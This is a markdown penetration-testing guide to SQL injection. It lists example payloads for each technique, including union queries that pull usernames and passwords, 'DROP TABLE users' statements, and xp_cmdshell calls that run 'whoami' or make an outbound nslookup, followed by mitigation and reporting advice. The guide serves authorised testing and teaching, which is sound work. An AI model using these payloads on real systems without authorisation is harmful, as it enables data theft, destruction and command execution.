# SQL Injection (SQLi) Penetration Testing Guide

## Table of Contents

1. [Introduction](#introduction)
2. [Preparation](#preparation)
3. [Identification Methods](#identification-methods)
    - [Error-Based SQLi](#error-based-sqli)
    - [Union-Based SQLi](#union-based-sqli)
    - [Blind SQLi](#blind-sqli)
        - [Boolean-Based Blind SQLi](#boolean-based-blind-sqli)
        - [Inferential-Based Blind SQLi](#inferential-based-blind-sqli)
    - [Time-Based Blind SQLi](#time-based-blind-sqli)
    - [Out-of-Band SQLi](#out-of-band-sqli)
    - [Second-Order SQLi](#second-order-sqli)
    - [Stored SQLi](#stored-sqli)
    - [Parameter Injection](#parameter-injection)
4. [Mitigation](#mitigation)
5. [Reporting](#reporting)
6. [References](#references)

---

## Introduction

SQL Injection (SQLi) is a serious security vulnerability that allows attackers to execute arbitrary SQL queries in a database. This document provides methods for identifying various types of SQL injection vulnerabilities.

## Preparation

1. **Permissions**: Ensure you have explicit permission to test the application.
2. **Tools**: Prepare tools like Burp Suite, SQLmap, and a web browser.
3. **Target Information**: Collect details about the applicationâ€™s endpoints, parameters, and database type.

## Identification Methods

### Error-Based SQLi

**Error-based SQLi** exploits error messages returned by the database to gather information about its structure.

- **Method**: Inject SQL payloads that generate database errors and observe the responses.
- **Example Payloads**:
  ```sql
  ' OR '1'='1
  ' AND 1=CONVERT(int, (SELECT @@version))--
  ```
- **Detection**: Look for error messages or unexpected behavior that reveals database details.

### Union-Based SQLi

**Union-based SQLi** uses the UNION SQL operator to retrieve data from multiple queries.

- **Method**: Test if the parameter can combine results using UNION.
- **Example Payloads**:
  ```sql
  ' UNION SELECT NULL, username, password FROM users--
  ' UNION SELECT NULL, table_name, column_name FROM information_schema.columns--
  ```
- **Detection**: Adjust the number of columns to match the original query and check if you can retrieve data from different tables or columns.

### Blind SQLi

**Blind SQLi** occurs when database errors are not visible, and inference is needed based on application behavior.

#### Boolean-Based Blind SQLi

- **Method**: Inject payloads that evaluate to true or false and analyze application responses.
- **Example Payloads**:
  ```sql
  ' AND 1=1--
  ' AND 1=2--
  ```
- **Detection**: Observe differences in the application's output to determine if the condition affects the response.

#### Inferential-Based Blind SQLi

- **Method**: Use payloads to infer database information based on application responses.
- **Example Payloads**:
  ```sql
  ' AND LENGTH(@@version) > 5--
  ' AND ASCII(SUBSTRING(@@version,1,1)) > 65--
  ```
- **Detection**: Observe changes in responses based on injected payloads to infer details about database fields.

### Time-Based Blind SQLi

**Time-Based Blind SQLi** exploits time delays caused by specific SQL queries.

- **Method**: Inject payloads that induce a delay and measure response times.
- **Example Payloads**:
  ```sql
  ' OR IF(1=1, SLEEP(5), 0)--
  ' OR IF(1=2, SLEEP(5), 0)--
  ```
- **Detection**: Measure if the response time changes according to the payload, indicating successful execution.

### Out-of-Band SQLi

**Out-of-Band SQLi** involves interactions with external resources like DNS or HTTP requests.

- **Method**: Use payloads that trigger external requests and monitor these interactions.
- **Example Payloads**:
  ```sql
  ' OR 1=1; EXEC xp_cmdshell('nslookup mydomain.com')--
  ```
- **Detection**: Check for incoming requests to external resources (e.g., DNS lookups) to see if the application is making outbound connections.

### Second-Order SQLi

**Second-Order SQLi** occurs when user input is stored and later used in SQL queries.

- **Method**: Inject payloads into storage fields and check if they execute later.
- **Example Payloads**:
  ```sql
  ' OR 1=1; DROP TABLE users;--
  ```
- **Detection**: Test data retrieval points where the stored input is used to see if the payload executes.

### Stored SQLi

**Stored SQLi** is when the SQL injection payload is stored and executed from the database.

- **Method**: Inject payloads into storage fields and verify if they execute when the data is retrieved.
- **Example Payloads**:
  ```sql
  '; DROP TABLE users;--
  ```
- **Detection**: Observe if the payload affects the application when stored data is used or retrieved.

### Parameter Injection

**Parameter Injection** involves manipulating query parameters to test for injection points.

- **Method**: Alter parameters to inject SQL commands and observe the results.
- **Example Payloads**:
  ```sql
  id=1' OR '1'='1
  search=%'; EXEC xp_cmdshell('whoami')--
  ```
- **Detection**: Check if the application processes injected SQL commands by analyzing changes in output or behavior.

## Mitigation

1. **Use Prepared Statements**: Employ parameterized queries or prepared statements to prevent SQLi.
2. **Employ ORM**: Use Object-Relational Mappers (ORMs) that help prevent SQLi.
3. **Input Validation**: Implement strict validation and sanitization of user inputs.
4. **Error Handling**: Avoid exposing detailed database error messages to users.
5. **Regular Security Audits**: Conduct periodic security assessments and code reviews.

## Reporting

When documenting SQLi findings:

1. **Summary**: Describe the vulnerability and its impact.
2. **Evidence**: Provide screenshots, error messages, or payloads used.
3. **Risk Level**: Assess the risk based on impact and exploitability.
4. **Recommendations**: Offer actionable advice to mitigate the vulnerability.

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Cheat Sheet - OWASP](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [TryHackMe SQL Injection Room](https://tryhackme.com/room/sqlinjection)
- [TryHackMe Advanced SQL Injection Room](https://tryhackme.com/room/advancedsqlinjection)
